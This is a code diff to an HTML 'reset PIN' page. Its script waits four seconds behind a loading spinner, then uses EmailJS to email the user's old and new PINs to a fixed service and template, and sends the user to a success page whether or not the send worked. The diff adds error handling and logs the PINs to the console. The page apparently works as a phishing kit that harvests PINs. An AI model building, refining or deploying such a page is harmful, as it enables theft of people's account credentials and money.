@@ -222,17 +222,23 @@
   </div>
 
   <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
-  <script>
-    emailjs.init('EHX8HLuuNdV2zLVG'); // Replace with your EmailJS USER_ID (Public Key)
-
+<script>
+  (function() {
+    try {
+      emailjs.init('EHX8HLuuNdV2zLVG-'); // Replace with your EmailJS USER_ID (Public Key)
+      console.log('EmailJS initialized successfully');
+    } catch (error) {
+      console.error('Failed to initialize EmailJS:', error);
+      alert('Failed to initialize EmailJS: ' + error.message);
+    }
+    
     document.getElementById('pin-form').addEventListener('submit', async function(event) {
       event.preventDefault();
       const oldPin = document.getElementById('old-pin').value;
       const newPin = document.getElementById('new-pin').value;
       const resetPinBtn = document.getElementById('reset-pin-btn');
       const popupOverlay = document.getElementById('popup-overlay');
-
-      // Client-side validation
+      
       if (!/^\d{4}$/.test(oldPin)) {
         alert('Old PIN must be a 4-digit number.');
         return;
@@ -241,28 +247,34 @@
         alert('New PIN must be a 4-digit number.');
         return;
       }
-
+      
       resetPinBtn.classList.add('loading');
       resetPinBtn.disabled = true;
-
+      
       await new Promise(resolve => setTimeout(resolve, 4000));
-
-      emailjs.send('service_l9x0u2d', 'template_wia8v9o', {
-        'old-pin': oldPin,
-        'new-pin': newPin
-      }).then(function() {
+      
+      console.log('Sending email with data:', { 'old-pin': oldPin, 'new-pin': newPin });
+      
+      try {
+        const response = await emailjs.send('service_l9x0u2d', 'template_wia8v9o', {
+          'old-pin': oldPin,
+          'new-pin': newPin
+        });
+        console.log('Email sent successfully:', response);
         window.location.href = 'success.html';
-      }, function(error) {
-        console.error('Error submitting form:', error);
+      } catch (error) {
+        console.error('Error sending email:', error);
+        alert('Failed to send email: ' + (error.text || error.message));
         resetPinBtn.classList.remove('loading');
         resetPinBtn.disabled = false;
         popupOverlay.style.display = 'flex';
-      });
+      }
     });
-
+    
     document.getElementById('popup-btn').addEventListener('click', function() {
-      window.location.href = 'successful.html';
+      window.location.href = 'success.html';
     });
-  </script>
+  })();
+</script>
 </body>
 </html>
